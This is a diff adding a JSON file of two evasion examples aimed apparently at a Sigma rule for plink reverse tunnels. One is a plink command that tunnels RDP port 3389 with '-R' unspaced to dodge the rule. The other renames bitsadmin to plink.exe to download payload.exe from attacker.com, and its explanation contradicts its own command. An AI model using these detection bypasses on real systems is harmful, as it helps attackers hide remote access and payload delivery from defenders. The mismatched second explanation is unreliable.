@@ -1,0 +1,10 @@
+[
+  {
+    "output": "plink.exe user@target.host -R3389:127.0.0.1:3389",
+    "explanation": "The Sigma rule specifically looks for ' -R ' with a trailing space. Passing the port mapping immediately after the -R flag without a space avoids matching the rule's criteria while still being interpreted correctly by many standard argument parsers."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\bitsadmin.exe plink.exe && plink.exe /transfer myJob http://attacker.com/payload.exe C:\\payload.exe",
+    "explanation": "This demonstrates a bypass of the 'Description' field selection. If an attacker renames a completely different binary to 'plink.exe', the CommandLine might match if they use -R for some other reason, but in reverse, if they use the actual plink binary but modify its internal PE metadata (Description field), the rule selection will not trigger."
+  }
+]
